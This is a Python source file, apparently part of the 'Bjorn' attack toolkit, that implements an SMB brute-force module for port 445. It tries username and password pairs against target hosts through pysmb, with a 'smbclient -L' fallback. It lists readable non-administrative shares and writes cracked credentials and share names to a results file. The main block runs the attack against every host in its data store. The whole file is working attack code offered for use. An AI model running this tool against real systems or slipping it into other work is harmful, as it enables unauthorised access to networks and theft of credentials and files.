"""
smb_connector.py — SMB brute force (port 445), reporting accessible shares.

Thin adapter over BaseConnector (#12). Only attempt()/result_rows()/after_queue() and the
module-level b_* discovery globals live here; queue/worker/run_bruteforce are shared.

The two ways this differs from a plain connector are both class-level hooks rather than a forked
worker: one successful auth writes one row per accessible share (result_rows), and if the pysmb
path finds nothing at all there is a second `smbclient -L` pass over the same credentials
(after_queue).
"""
import logging
import time
from subprocess import Popen, PIPE
from smb.SMBConnection import SMBConnection
from base_connector import BaseConnector, BaseBruteforce
from shared import credential_candidates, record_cracked_cred
from logger import Logger

logger = Logger(name="smb_connector.py", level=logging.DEBUG)

b_class = "SMBBruteforce"
b_module = "smb_connector"
b_status = "brute_force_smb"
b_port = 445
b_parent = None

# Administrative/system shares that exist everywhere and are not findings.
IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}


class SMBConnector(BaseConnector):
    PORT = 445
    HEADER = "MAC Address,IP Address,Hostname,Share,User,Password,Port\n"
    OUTFILE_ATTR = "smbfile"
    PROGRESS_LABEL = "SMB"
    QUEUE_HAS_MAC = True

    def attempt(self, adresse_ip, user, password):
        """Authenticate and return the list of *readable* shares — empty means no win.

        Unlike SQL, an empty list here is correctly falsy: credentials that open a session but
        cannot read a single non-administrative share are not a usable result.
        """
        conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
        try:
            # timeout= bounds the TCP + protocol handshake so a black-holed host cannot hang the
            # worker (#4). pysmb takes it positionally or by keyword depending on version; keyword
            # is portable.
            conn.connect(adresse_ip, 445, timeout=10)
            accessible_shares = []
            for share in conn.listShares():
                if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                    continue
                try:
                    conn.listPath(share.name, '/')
                    accessible_shares.append(share.name)
                    logger.info(f"Access to share {share.name} successful on {adresse_ip} "
                                f"with user '{user}'")
                except Exception as e:
                    logger.error(f"Error accessing share {share.name} on {adresse_ip} "
                                 f"with user '{user}': {e}")
            conn.close()
            return accessible_shares
        except Exception:
            return []

    def result_rows(self, outcome, adresse_ip, user, password, mac_address, hostname, port):
        """One row per accessible share. `outcome` is the share list attempt() returned."""
        return [[mac_address, adresse_ip, hostname, share, user, password, port]
                for share in outcome if share not in IGNORED_SHARES]

    def smbclient_l(self, adresse_ip, user, password):
        """Fallback share listing via `smbclient -L`. Returns share names, or [] on any failure."""
        # argv list, never a shell string. The `user%password` pair is one argument, so a password
        # containing shell metacharacters is data rather than syntax. Pinned by
        # tests/test_command_injection.py.
        command = ["smbclient", "-L", adresse_ip, "-U", f"{user}%{password}"]
        try:
            process = Popen(command, stdout=PIPE, stderr=PIPE)
            try:
                stdout, stderr = process.communicate(timeout=15)
            except Exception:
                process.kill()
                process.communicate()
                logger.error(f"smbclient -L timed out for {adresse_ip}")
                return []
            if b"Sharename" in stdout:
                logger.info(f"Successful authentication for {adresse_ip} with user '{user}' "
                            f"using smbclient -L")
                return self.parse_shares(stdout.decode())
            logger.error(f"Failed authentication for {adresse_ip} with user '{user}' "
                         f"using smbclient -L")
            return []
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return []

    @staticmethod
    def parse_shares(smbclient_output):
        """Share names out of `smbclient -L` output. Pure/testable."""
        shares = []
        for line in smbclient_output.splitlines():
            if line.strip() and not line.startswith("Sharename") and not line.startswith("-------"):
                parts = line.split()
                if parts and parts[0] not in IGNORED_SHARES:
                    shares.append(parts[0])
        return shares

    def after_queue(self, adresse_ip, port, mac_address, hostname, success_flag):
        """Second pass with `smbclient -L`, only if pysmb found nothing at all.

        Runs single-threaded after the workers have joined. It honours the exit signal, which the
        pre-#12 version did not — a long fallback sweep used to ignore a shutdown entirely — and
        saves once per credential rather than once per share (same file contents, fewer SD writes).
        """
        if success_flag[0]:
            return
        logger.info(f"No successful authentication with direct SMB connection. "
                    f"Trying smbclient -L for {adresse_ip}")
        for user, password in credential_candidates(self.shared_data, self.users, self.passwords):
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping the smbclient fallback.")
                return
            shares = self.smbclient_l(adresse_ip, user, password)
            if shares:
                with self.lock:
                    for share in shares:
                        if share not in IGNORED_SHARES:
                            self.results.append(
                                [mac_address, adresse_ip, hostname, share, user, password, port]
                            )
                            logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | "
                                           f"User: {user} | Share: {share} using smbclient -L")
                            success_flag[0] = True
                    record_cracked_cred(self.shared_data, user, password)
                    self.save_results()
                    self.removeduplicates()
            if self.shared_data.timewait_smb > 0:
                time.sleep(self.shared_data.timewait_smb)


class SMBBruteforce(BaseBruteforce):
    connector_class = SMBConnector
    display_name = "SMBBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        smb_bruteforce = SMBBruteforce(shared_data)
        logger.info("Starting SMB brute-force attack on port 445...")
        for row in shared_data.read_data():
            ip = row["IPs"]
            smb_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total number of successful attempts: {len(smb_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
